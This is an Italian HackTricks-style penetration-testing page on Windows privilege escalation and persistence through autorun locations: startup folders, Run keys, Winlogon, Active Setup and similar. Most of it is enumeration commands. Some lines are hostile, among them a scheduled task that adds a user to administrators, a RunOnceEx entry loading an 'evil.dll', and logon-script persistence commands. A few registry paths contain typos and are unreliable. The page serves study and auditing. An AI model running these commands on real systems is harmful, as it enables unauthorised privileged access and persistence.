# Escalationi dei privilegi con Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** può essere usato per eseguire programmi all'**avvio**. Per vedere quali binari sono configurati per essere eseguiti all'avvio, usa:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Attività pianificate

Le **attività** possono essere pianificate per essere eseguite con una **frequenza specifica**. Usa i seguenti comandi per vedere quali binari sono pianificati per l'esecuzione:

```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtasks.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Un'attività abilitata eseguita come SYSTEM merita di essere esaminata anche quando la definizione dell'attività e il file dell'azione sono protetti. [Utilità di pianificazione richiede l'autorizzazione di esecuzione sull'attività per avviarla su richiesta](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks). Se un utente con privilegi limitati dispone di tale autorizzazione, esamina l'azione esatta, in particolare gli script PowerShell che modificano le ACL di Active Directory o reimpostano le impostazioni di protezione degli account. Controlla l'impostazione `AllowDemandStart` dell'attività e verifica gli input e gli effetti dello script; la sola autorizzazione ad avviare un'attività predefinita non implica l'esecuzione di codice arbitrario.

## Cartelle

Tutti i binari presenti nelle **cartelle di avvio verranno eseguiti all'avvio**. Le cartelle di avvio più comuni sono quelle elencate di seguito, ma la cartella di avvio è indicata nel registro. [Leggi qui per scoprire dove.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

Una voce Startup di un utente con privilegi maggiori potrebbe avviare uno script protetto che apre ripetutamente file da una directory in cui un altro utente può scrivere. Prima di considerare quella directory un possibile percorso di escalation, verifica l'**identità effettiva con cui viene eseguito l'accesso**, la directory di input dello script e le relative ACL, nonché l'azione esatta. In particolare, [`hh.exe` apre file HTML Help compilati (`.chm`)](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/about-the-html-help-executable-program); uno script che gli passa file forniti dal chiamante oltrepassa un confine di attendibilità dei contenuti, anche se controlla il nome del file o i primi byte. [Le policy di HTML Help possono limitare i collegamenti eseguibili](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/htmlhelp/system-policies-for-shortcut-and-winhelp-commands), quindi verifica la policy installata e il comportamento dei contenuti raggiungibili. La sola estensione `.chm` o la sola firma binaria non dimostrano l'esecuzione di codice con privilegi maggiori. Esamina l'autorun, la riga di comando del processo e le autorizzazioni del percorso senza aprire il file non attendibile durante l'enumerazione.

Lo stesso confine di attendibilità dei contenuti esiste quando una persona con privilegi maggiori **apre manualmente** un `.chm` da una cartella di documentazione che un altro utente può sostituire. Verifica i diritti di scrittura sul file esatto e sulla directory superiore, l'identità effettiva del visualizzatore e l'evento di apertura, nonché la policy HTML Help applicata. Una cartella scrivibile o una richiesta di esaminare la documentazione non dimostrano che l'identità con privilegi maggiori abbia aperto contenuti controllati da un attacker.

> **FYI**: le vulnerabilità di *path traversal* durante l'estrazione di archivi (come quella sfruttata in WinRAR prima della versione 7.13 – CVE-2025-8088) possono essere usate per **depositare payload direttamente in queste cartelle Startup durante la decompressione**, ottenendo l'esecuzione di codice al successivo accesso dell'utente. Per un approfondimento su questa tecnica, vedi:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registro

> [!TIP]
> [Nota da qui](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): la voce del Registro **Wow6432Node** indica che stai usando una versione di Windows a 64 bit. Il sistema operativo usa questa chiave per visualizzare una vista separata di HKEY_LOCAL_MACHINE\SOFTWARE per le applicazioni a 32 bit eseguite su versioni di Windows a 64 bit.

### Run

Voci di registro **AutoRun** comunemente note:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Le chiavi del Registro note come **Run** e **RunOnce** sono progettate per eseguire automaticamente programmi ogni volta che un utente accede al sistema. La riga di comando assegnata come valore dati di una chiave è limitata a 260 caratteri.<sup>[[2]](#references)</sup>

**Run dei servizi** (possono controllare l'avvio automatico dei servizi durante il boot):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

In Windows Vista e versioni successive, le chiavi del Registro **Run** e **RunOnce** non vengono generate automaticamente. Le voci in queste chiavi possono avviare direttamente i programmi oppure specificarli come dipendenze. Per esempio, per caricare un file DLL all'accesso, si potrebbe usare la chiave del Registro **RunOnceEx** insieme a una chiave "Depend". Ecco come aggiungere una voce del Registro per eseguire "C:\temp\evil.dll" all'avvio del sistema:<sup>[[2]](#references)</sup>

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

> [!TIP]
> **Exploit 1**: Se puoi scrivere in una qualsiasi delle chiavi di registro menzionate in **HKLM**, puoi aumentare i privilegi quando accede un altro utente.

> [!TIP]
> **Exploit 2**: Se puoi sovrascrivere uno qualsiasi dei binari indicati in una qualsiasi delle chiavi di registro in **HKLM**, puoi modificarlo inserendo una backdoor quando accede un altro utente e aumentare i privilegi.

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Percorso di avvio

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

I collegamenti inseriti nella cartella **Startup** avviano automaticamente servizi o applicazioni durante l'accesso dell'utente o il riavvio del sistema. Il percorso della cartella **Startup** è definito nel registro per gli ambiti **Local Machine** e **Current User**. Ciò significa che qualsiasi collegamento aggiunto a queste posizioni **Startup** specificate farà sì che il servizio o il programma a cui punta venga avviato dopo l'accesso o il riavvio, rendendo questo un metodo semplice per pianificare l'esecuzione automatica dei programmi.<sup>[[1]](#references)[[2]](#references)</sup>

> [!TIP]
> Se riesci a sovrascrivere qualsiasi User Shell Folder in **HKLM**, potrai reindirizzarla a una cartella sotto il tuo controllo e inserire una backdoor che verrà eseguita ogni volta che un utente accede al sistema, consentendo l'escalation dei privilegi.

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Questo valore del registro per utente può puntare a uno script o a un comando eseguito quando l'utente effettua l'accesso. È principalmente una primitiva di **persistence**, perché viene eseguita solo nel contesto dell'utente interessato, ma vale comunque la pena controllarla durante le attività di post-exploitation e le verifiche degli autoruns.<sup>[[3]](#references)[[6]](#references)[[7]](#references)</sup>

> [!TIP]
> Se puoi modificare questo valore per l'utente corrente, puoi attivare nuovamente l'esecuzione al successivo accesso interattivo senza bisogno dei diritti di amministratore. Se puoi modificarlo nell'hive di un altro utente, potresti ottenere l'esecuzione di codice quando quell'utente effettua l'accesso.

```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```

Note:

- Preferisci i percorsi completi dei file `.bat`, `.cmd`, `.ps1` o di altri launcher già leggibili dall'utente target.
- La persistenza rimane attiva fino alla rimozione del valore, anche dopo la disconnessione o il riavvio.
- A differenza di `HKLM\...\Run`, questa chiave **non** concede privilegi elevati da sola: la persistenza è limitata all'utente.

### Chiavi Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

In genere, la chiave **Userinit** è impostata su **userinit.exe**. Tuttavia, se questa chiave viene modificata, anche l'eseguibile specificato verrà avviato da **Winlogon** all'accesso dell'utente. Analogamente, la chiave **Shell** dovrebbe puntare a **explorer.exe**, la shell predefinita di Windows.<sup>[[1]](#references)</sup>

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

> [!TIP]
> Se puoi sovrascrivere il valore del registro o il binario, potrai aumentare i privilegi.

### Impostazioni dei criteri

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Controlla la chiave **Run**.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Modifica del prompt dei comandi in modalità provvisoria

Nel Registro di Windows, in `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, è presente un valore **`AlternateShell`** impostato per impostazione predefinita su `cmd.exe`. Questo significa che, quando all'avvio si sceglie "Modalità provvisoria con prompt dei comandi" (premendo F8), viene usato `cmd.exe`. È però possibile configurare il computer in modo che si avvii automaticamente in questa modalità, senza dover premere F8 e selezionarla manualmente.

Procedura per creare un'opzione di avvio che avvii automaticamente il computer in "Modalità provvisoria con prompt dei comandi":<sup>[[5]](#references)</sup>

1. Modifica gli attributi del file `boot.ini` per rimuovere i flag di sola lettura, sistema e nascosto: `attrib c:\boot.ini -r -s -h`
2. Apri `boot.ini` per modificarlo.
3. Inserisci una riga come: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Salva le modifiche a `boot.ini`.
5. Ripristina gli attributi originali del file: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Modificare la chiave di registro **AlternateShell** consente di configurare una shell dei comandi personalizzata, con il potenziale rischio di accessi non autorizzati.
- **Exploit 2 (permessi di scrittura su PATH):** Avere permessi di scrittura su una qualsiasi parte della variabile di sistema **PATH**, soprattutto prima di `C:\Windows\system32`, consente di eseguire un `cmd.exe` personalizzato, che potrebbe fungere da backdoor se il sistema viene avviato in modalità provvisoria.
- **Exploit 3 (permessi di scrittura su PATH e boot.ini):** L'accesso in scrittura a `boot.ini` consente di configurare l'avvio automatico in modalità provvisoria, facilitando l'accesso non autorizzato al riavvio successivo.

Per controllare l'impostazione corrente di **AlternateShell**, usa questi comandi:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Componente installato

Active Setup è una funzionalità di Windows che **viene avviata prima che l'ambiente desktop sia completamente caricato**. Dà priorità all'esecuzione di determinati comandi, che devono essere completati prima che prosegua l'accesso dell'utente. Questo processo avviene persino prima dell'attivazione di altre voci di avvio, come quelle nelle sezioni del registro Run o RunOnce.

Active Setup è gestito tramite le seguenti chiavi del registro:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

All'interno di queste chiavi sono presenti varie sottochiavi, ciascuna corrispondente a un componente specifico. Tra i valori delle chiavi, sono particolarmente interessanti:

- **IsInstalled:**
  - `0` indica che il comando del componente non verrà eseguito.
  - `1` significa che il comando verrà eseguito una volta per ogni utente; questo è il comportamento predefinito se manca il valore `IsInstalled`.
- **StubPath:** definisce il comando che Active Setup deve eseguire. Può essere qualsiasi riga di comando valida, ad esempio l'avvio di `notepad`.

**Considerazioni sulla sicurezza:**

- Modificare o scrivere in una chiave in cui **`IsInstalled`** è impostato su `"1"` e che contiene uno specifico **`StubPath`** può causare l'esecuzione non autorizzata di comandi, con potenziale escalation dei privilegi.
- Anche alterare il file binario a cui fa riferimento un valore **`StubPath`** può consentire l'escalation dei privilegi, se si dispone di autorizzazioni sufficienti.

Per esaminare le configurazioni di **`StubPath`** nei componenti di Active Setup, è possibile usare questi comandi:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Panoramica dei Browser Helper Objects (BHO)

I Browser Helper Objects (BHO) sono moduli DLL che aggiungono funzionalità a Microsoft Internet Explorer. Vengono caricati in Internet Explorer e Windows Explorer a ogni avvio. Tuttavia, è possibile impedirne l'esecuzione impostando la chiave **NoExplorer** su 1, evitando così che vengano caricati nelle istanze di Windows Explorer.<sup>[[1]](#references)</sup>

I BHO sono compatibili con Windows 10 tramite Internet Explorer 11, ma non sono supportati in Microsoft Edge, il browser predefinito nelle versioni più recenti di Windows.

Per esaminare i BHO registrati in un sistema, è possibile controllare le seguenti chiavi del registro:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Ogni BHO è rappresentato nel registro dal proprio **CLSID**, che funge da identificatore univoco. È possibile trovare informazioni dettagliate su ciascun CLSID in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Per interrogare i BHO nel registro, è possibile utilizzare questi comandi:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Estensioni di Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Si noti che nel Registro sarà presente una nuova chiave per ogni DLL, identificata dal **CLSID**. È possibile trovare le informazioni sul CLSID in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Driver dei font

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Comando di apertura

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Gestori COM del menu contestuale

I gestori del menu contestuale di Explorer sono estensioni della shell registrate in chiavi come `HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers` e `HKLM\SOFTWARE\Classes\Folder\shellex\ContextMenuHandlers`. Il valore predefinito di un gestore, o talvolta il nome della sua chiave, è un CLSID. Segui quel CLSID fino a `HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32`; il suo valore predefinito indica la DLL caricata quando viene richiamato il gestore.

```powershell
reg query "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers" /s
reg query "HKLM\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32" /ve
Get-Acl 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InprocServer32' |
  Select-Object -ExpandProperty Access
```

Verifica entrambe le viste del registro a 32 e 64 bit. `HKCR` unisce le registrazioni delle classi per utente e quelle a livello di computer, quindi verifica quale chiave sottostante verrà risolta da un processo. Un'identità con privilegi limitati che può modificare un valore `InprocServer32` a livello di computer può reindirizzare un processo con privilegi più elevati verso un'altra DLL, ma per ottenere l'escalation è necessario che quel processo invochi il gestore. Anche un percorso DLL scrivibile può comportare un rischio simile, persino quando il valore del registro è protetto.

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Nota che tutti i percorsi in cui puoi trovare autoruns sono **già analizzati da**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Tuttavia, per un **elenco più completo dei file eseguiti automaticamente**, puoi usare [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) di systinternals:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## Altro

**Trova altri Autoruns simili alle chiavi di registro in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)<sup>[[4]](#references)</sup>

## References

- [1] [Meccanismi comuni di persistenza dei malware](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [2] [MITRE ATT&CK T1547.001 – Esecuzione automatica all'avvio o all'accesso: chiavi Run del registro / cartella Startup](https://attack.mitre.org/techniques/T1547/001/)
- [3] [MITRE ATT&CK T1037.001 – Script di inizializzazione all'avvio o all'accesso: script di accesso (Windows)](https://attack.mitre.org/techniques/T1037/001/)
- [4] [Autoruns – Categorie di avvio automatico (Risoluzione dei problemi con gli strumenti Windows Sysinternals, 2ª edizione)](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [5] [Come posso aggiungere un'opzione di avvio che avvii una shell alternativa?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Riepilogo Metasploit del 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [PR Metasploit #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
{{#include ../../banners/hacktricks-training.md}}
